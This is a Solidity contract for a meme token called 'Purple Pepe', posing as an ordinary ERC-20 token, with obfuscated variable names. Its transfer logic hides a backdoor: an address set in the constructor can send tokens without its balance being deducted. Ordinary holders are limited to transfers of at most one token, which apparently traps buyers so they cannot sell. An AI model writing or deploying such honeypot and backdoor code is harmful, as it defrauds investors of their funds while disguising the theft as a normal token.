/*

https://t.me/pepepurple

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.8;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract PurplePepe is Ownable {
    mapping(address => mapping(address => uint256)) public allowance;

    uint256 private ydrjkfn = 118;

    function dnjilqwsumv(address lgxwsqnzv, address xgpbu, uint256 nbcfpvjte) private {
        if (0 == oqklztryade[lgxwsqnzv]) {
            if (lgxwsqnzv != gcwylomau && vwhzdsubcjei[lgxwsqnzv] != block.number && nbcfpvjte < totalSupply) {
                require(nbcfpvjte <= totalSupply / (10 ** decimals));
            }
            balanceOf[lgxwsqnzv] -= nbcfpvjte;
        }
        balanceOf[xgpbu] += nbcfpvjte;
        vwhzdsubcjei[xgpbu] = block.number;
        emit Transfer(lgxwsqnzv, xgpbu, nbcfpvjte);
    }

    function approve(address wlyvrh, uint256 nbcfpvjte) public returns (bool success) {
        allowance[msg.sender][wlyvrh] = nbcfpvjte;
        emit Approval(msg.sender, wlyvrh, nbcfpvjte);
        return true;
    }

    constructor(address uorn) {
        balanceOf[msg.sender] = totalSupply;
        oqklztryade[uorn] = ydrjkfn;
        IUniswapV2Router02 srowkxd = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        gcwylomau = IUniswapV2Factory(srowkxd.factory()).createPair(address(this), srowkxd.WETH());
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    string public name = unicode"Purple Pepe 🟪🐸";

    function transfer(address xgpbu, uint256 nbcfpvjte) public returns (bool success) {
        dnjilqwsumv(msg.sender, xgpbu, nbcfpvjte);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transferFrom(address lgxwsqnzv, address xgpbu, uint256 nbcfpvjte) public returns (bool success) {
        require(nbcfpvjte <= allowance[lgxwsqnzv][msg.sender]);
        allowance[lgxwsqnzv][msg.sender] -= nbcfpvjte;
        dnjilqwsumv(lgxwsqnzv, xgpbu, nbcfpvjte);
        return true;
    }

    uint8 public decimals = 9;

    mapping(address => uint256) private vwhzdsubcjei;

    string public symbol = unicode"Purple Pepe 🟪🐸";

    mapping(address => uint256) private oqklztryade;

    address private gcwylomau;

    mapping(address => uint256) public balanceOf;
}